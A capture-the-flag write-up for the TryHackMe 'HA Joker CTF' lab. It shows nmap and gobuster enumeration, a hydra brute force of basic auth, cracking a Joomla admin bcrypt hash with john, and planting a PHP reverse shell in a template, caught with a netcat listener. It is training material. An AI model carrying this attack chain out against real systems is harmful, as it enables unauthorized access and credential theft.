# THM: HA Joker CTF

| Stat | Value |
| ---------- | -------------------------------------------- |
| Image | <img src="../../images/write_ups/try_hack_me/ha_joker_ctf/ha_joker_ctf.jpeg" alt="HA Joker CTF" width="90"/> |
| Room | HA Joker CTF |
| URL | [https://tryhackme.com/room/jokerctf](https://tryhackme.com/room/jokerctf) |
| Difficulty | Easy |

## Concepts/Tools Used

- [gobuster](../../tools/gobuster.md)
- [hydra](../../tools/hydra.md)
- [john](../../tools/john.md)

## Room Description

Batman hits Joker.

## Process

Once the machine starts up I save the machine's ip address to my host file so that I can type `target.thm` instead of an ip address.

## Enumerate services on target machine.

I run nmap to see what ports are open:
```bash
$ nmap -T4 -n -sC -sV -Pn -v -p- target.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-02 04:58 BST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 04:58
Completed NSE at 04:58, 0.00s elapsed
Initiating NSE at 04:58
Completed NSE at 04:58, 0.00s elapsed
Initiating NSE at 04:58
Completed NSE at 04:58, 0.00s elapsed
Initiating ARP Ping Scan at 04:58
Scanning target.thm (10.10.83.112) [1 port]
Completed ARP Ping Scan at 04:58, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 04:58
Scanning target.thm (10.10.83.112) [65535 ports]
Discovered open port 8080/tcp on 10.10.83.112
Discovered open port 22/tcp on 10.10.83.112
Discovered open port 80/tcp on 10.10.83.112
Completed SYN Stealth Scan at 04:58, 2.35s elapsed (65535 total ports)
Initiating Service scan at 04:58
Scanning 3 services on target.thm (10.10.83.112)
Completed Service scan at 04:58, 6.07s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.83.112.
Initiating NSE at 04:58
Completed NSE at 04:58, 0.47s elapsed
Initiating NSE at 04:58
Completed NSE at 04:58, 0.01s elapsed
Initiating NSE at 04:58
Completed NSE at 04:58, 0.01s elapsed
Nmap scan report for target.thm (10.10.83.112)
Host is up (0.000096s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA)
|   256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA)
|_  256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HA: Joker
8080/tcp open  http    Apache httpd 2.4.29
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Please enter the password.
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 401 Unauthorized
MAC Address: 02:17:AC:6D:9E:AB (Unknown)
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 04:58
Completed NSE at 04:58, 0.00s elapsed
Initiating NSE at 04:58
Completed NSE at 04:58, 0.00s elapsed
Initiating NSE at 04:58
Completed NSE at 04:58, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.95 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

## What version of Apache is it?

Looking at the nmap output above, Apache is running on ports 80 and 8080. The version is 2.4.29.

## What port on this machine does not need to be authenticated by user and password?

Port 22 is ssh and it requires an ssh key or a username and password combination, so it can't be this port. That means it has to be either port 80 or 8080. I pull up the site in Chrome by navigating to http://target.thm. This page isn't using basic authentication. Since the url is http protocol and a port wasn't specified it defaults to 80. That is the answer.

## There is a file on this port that seems to be secret, what is it?

The question is asking for a specific file. I inspected the html source code and didn't see a commented directory. The html comments on this capture the flag site are comments of the Joker character in movies and shows.

Since it is asking for a file, I run the following command to enumerate files:

```bash
$ gobuster dir -u http://target.thm -w /usr/share/wordlists/dirb/common.txt -x txt,php,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/.hta.php             (Status: 403) [Size: 275]
/.hta                 (Status: 403) [Size: 275]
/.hta.zip             (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/.htaccess.zip        (Status: 403) [Size: 275]
/.htpasswd.zip        (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.hta.txt             (Status: 403) [Size: 275]
/css                  (Status: 301) [Size: 306] [--> http://target.thm/css/]
/img                  (Status: 301) [Size: 306] [--> http://target.thm/img/]
/index.html           (Status: 200) [Size: 5954]
/phpinfo.php          (Status: 200) [Size: 94759]
/phpinfo.php          (Status: 200) [Size: 94759]
/secret.txt           (Status: 200) [Size: 320]
/server-status        (Status: 403) [Size: 275]
```

I made sure to include `-x txt,php,zip` to let gobuster know what files I am specifically looking for. The file is secret.txt

## There is another file which reveals information of the backend, what is it?

The other file listed in the output from gobuster is the file that tell a lot about the backend. Going to http://target.thm/phpinfo.php displays all the output from the phpinfo() function. This is something that should not make it to production.

## When reading the secret file, ee find with a conversation that seems contains at least two users and some keywords that can be interesting, what user do you think it is?

I download the secret.txt file with the following command:

```bash
$ wget http://target.thm/secret.txt
```

Then I output the text in this file by running the following:

```bash
$ cat secret.txt 
Batman hits Joker.
Joker: "Bats you may be a rock but you won't break me." (Laughs!)
Batman: "I will break you with this rock. You made a mistake now."
Joker: "This is one of your 100 poor jokes, when will you get a sense of humor bats! You are dumb as a rock."
Joker: "HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA!"
```

There are a lot of hints in this conversation. I see two usernames batman and joker. Batman hints that he can break Joker with a rock. This is a reference that using the rockyou.txt wordlist will crack the joker. This means that joker is the user and their password is in the rockyou.txt file.

## What port on this machine needs to be authenticated by Basic Authentication mechanism?

Going back to the output from nmap, there is only one port that runs http left. I check port 8080 by going to http://target.thm:8080. It uses basic authentication.

## At this point we have one user and a url that needs to be aunthenticated, brute force it to get the password, what is that password?

I am going to use hydra with the joker username and the rockyou.txt wordlist to log into the site on port 8080. I let hydra know that I am trying to break basic authentication by using the http-get protocol in the command. Here is the command I used:

```bash
$ hydra -l joker -P /usr/share/wordlists/rockyou.txt http-get://target.thm:8080
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-02 17:46:27
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-get://target.thm:8080/
[8080][http-get] host: target.thm   login: joker   password: REDACTED
1 of 1 target successfully completed, 1 valid password found
```

Hydra very quickly found the password and I am able to log into the site.

## Yeah!! We got the user and password and we see a cms based blog. Now check for directories and files in this port. What directory looks like as admin directory?

I need to run gobuster again. The command is the same as before except it now specifies port 8080, username joker and the password found earlier. Here is the command:

```bash
$ gobuster dir -u http://target.thm:8080 -w /usr/share/wordlists/dirb/common.txt -U joker -P REDACTED -x txt,php,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target.thm:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Auth User:               joker
[+] Extensions:              php,zip,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htaccess.zip        (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswd.zip        (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.hta.zip             (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/administrator        (Status: 301) [Size: 323] [--> http://target.thm:8080/administrator/]
/backup               (Status: 200) [Size: 12133560]
/backup.zip           (Status: 200) [Size: 12133560]
/bin                  (Status: 301) [Size: 313] [--> http://target.thm:8080/bin/]
/cache                (Status: 301) [Size: 315] [--> http://target.thm:8080/cache/]
/components           (Status: 301) [Size: 320] [--> http://target.thm:8080/components/]
/configuration.php    (Status: 200) [Size: 0]
/images               (Status: 301) [Size: 316] [--> http://target.thm:8080/images/]
/includes             (Status: 301) [Size: 318] [--> http://target.thm:8080/includes/]
/index.php            (Status: 200) [Size: 10939]
/index.php            (Status: 200) [Size: 10939]
/language             (Status: 301) [Size: 318] [--> http://target.thm:8080/language/]
/layouts              (Status: 301) [Size: 317] [--> http://target.thm:8080/layouts/]
/libraries            (Status: 301) [Size: 319] [--> http://target.thm:8080/libraries/]
/LICENSE              (Status: 200) [Size: 18092]
/LICENSE.txt          (Status: 200) [Size: 18092]
/media                (Status: 301) [Size: 315] [--> http://target.thm:8080/media/]
/modules              (Status: 301) [Size: 317] [--> http://target.thm:8080/modules/]
/plugins              (Status: 301) [Size: 317] [--> http://target.thm:8080/plugins/]
/README               (Status: 200) [Size: 4494]
/README.txt           (Status: 200) [Size: 4494]
/robots               (Status: 200) [Size: 836]
/robots.txt           (Status: 200) [Size: 836]
/robots.txt           (Status: 200) [Size: 836]
/server-status        (Status: 403) [Size: 277]
/templates            (Status: 301) [Size: 319] [--> http://target.thm:8080/templates/]
/tmp                  (Status: 301) [Size: 313] [--> http://target.thm:8080/tmp/]
/web.config.txt       (Status: 200) [Size: 1690]
/web.config           (Status: 200) [Size: 1690]
```

Looking over the results the only directory that immediately looks like an admin directory is the /administrator directory.

## We need access to the administration of the site in order to get a shell, there is a backup file, What is this file?

The output from the above gobuster command shows that there is a zip file called backup.zip.

## We have the backup file and now we should look for some information, for example database, configuration files, etc ... But the backup file seems to be encrypted. What is the password?

First things first, I need to download the backup file. I use the following command:

```bash
$ wget http://target.thm:8080/backup.zip --user=joker --password=REDACTED
```

I tried to unzip the backup.zip file and it asked for a password. Here is the command I used to try to unzip the file:

```bash
$ unzip backup.zip
```

I tried the password that I found earlier and it worked. If I ever needed to crack a zip password, I would follow the steps on my [john tool page](../../tools/john.md#zip-archive-file).

This unzipped two folders, db and site.

## Remember that... we need access to the administration of the site... Blah blah blah. In our new discovery we see some files that have compromising information, maybe db? Ok, what if we do a restoration of the database! Some tables must have something like user_table! What is the super duper user?

After unzipping the backup.zip file, I went into the db folder. There is a single file called joomladb.sql in this folder. Since this is a .sql file, I can search the file or I can as the question states import the file into a sql database.

I took the lazy approach and searched the file. I ran a single command to see if I could find the spot in the file that has the "user_table". I was trying to find lines that had "_user" in them. As it turned out, the last entry had what I was looking for:

```bash
$ grep '_user' joomladb.sql
...
INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.com','$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG',0,1,'2019-10-08 12:00:15','2019-10-25 15:20:02','0','{\"admin_style\":\"\",\"admin_language\":\"\",\"language\":\"\",\"editor\":\"\",\"helpsite\":\"\",\"timezone\":\"\"}','0000-00-00 00:00:00',0,'','',0);
/*!40000 ALTER TABLE `cc1gr_users` ENABLE KEYS */;
```

Those are the last two lines out the grep search. The super duper user is admin.

## Super Duper User! What is the password?

The password hash is $2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG. Judging by the start of $2y I am confident this is a bcrypt password. I put that hash into a file called hash.txt and I run the following command:

```bash
$ john hash.txt
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/opt/john/password.lst
REDACTED         (?)
1g 0:00:00:15 DONE 2/3 (2025-07-02 18:40) 0.06293g/s 46.44p/s 46.44c/s 46.44C/s yellow..allison
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

John was able to quickly crack this password.

## At this point, you should be upload a reverse-shell in order to gain shell access. What is the owner of this session?

I go to http://target.thm:8080/administrator and log in as the user admin with the password that john just cracked. This opens us the Joomla control panel.

Joomla is a content management system (CMS) that makes it easier to make a website. One of the features it provides is a way to style your content in different ways. From the homepage of the control panel I went to Extensions > Templates > Templates. There are two different templates that are listed so I need to know which one is the current one.

To find out which one is active, I go back to the homepage of the control panel and click Templates on the left hand side. This shows that protostar is the default.

Now that I know which one is the default, I go back to Extensions > Templates > Templates and click protostar. On the left hand side I click index.php. I copy the [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and paste it on the top of the index.php file. I update the script to use my attack machine ip address and port 4444. I save the file.

### Getting a Foothold

I start a listening netcat session on my attack machine by running the following:

```bash
$ nc -lnvp 4444
```
I then load the page at http://target.thm:8080

I have a shell. I'm in!

I run the following command to see what user I am running this shell as:

```bash
$ whoami
www-data
```

## This user belongs to a group that differs on your own group, What is this group?

I look at the groups for this user by running:

```bash
$ groups
www-data lxd
```

I spawn a tty shell by following [the guide here](../../README.md#stable-shell)
